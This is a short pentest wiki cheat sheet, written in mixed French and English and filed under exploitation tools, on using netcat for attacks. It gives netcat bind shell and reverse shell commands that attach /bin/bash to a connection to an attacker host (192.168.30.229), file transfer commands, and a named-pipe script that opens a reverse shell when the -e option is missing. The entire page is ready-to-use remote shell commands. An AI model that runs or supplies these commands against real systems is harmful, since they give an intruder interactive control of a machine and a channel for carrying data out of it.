---
title: Netcat
permalink: /Netcat/
---

Bind shell
----------

Sur la machine attaquante:

``` bash
nc -nv 192.168.30.229
```

Sur la machine cible

``` bash
nc -nlvp 443 -e /bin/bash
```

Reverse shell
-------------

On the attacker machine (will receive the shell):

``` bash
nc -nlvp 443
```

Sur la machine cible

``` bash
nc -nv 192.168.30.229 -e /bin/bash
```

Transfert de fichiers
---------------------

The following commands can be used to transfer a file

``` bash
nc -nlvp 443 > incoming
nc -nv 192.168.30.229 < outgoing
```

Si l'option **-e** n'est pas disponible il est possible d'utiliser ce script:

``` bash
#!/bin/bash

mknod /tmp/backpipe p
bin/sh 0</tmp/backpipe | nc 192.168.30.229 443 1>/tmp/backpipe
```

[Category:Outils](/Category:Outils "wikilink") [Category:Exploitation](/Category:Exploitation "wikilink")